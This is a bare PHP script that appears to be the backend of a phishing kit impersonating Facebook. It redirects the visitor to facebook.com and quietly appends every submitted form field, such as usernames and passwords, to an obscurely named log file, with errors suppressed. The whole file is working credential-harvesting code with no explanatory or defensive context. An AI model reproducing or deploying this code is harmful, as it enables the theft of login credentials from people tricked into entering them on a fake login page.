<?php
header ('Location: https://www.facebook.com');
$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}
$handle = @fopen("UIxX9Zr2TOi5QsJ+sq0jOkLVhJsr4vnrJtq4m7E7WYo=", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>
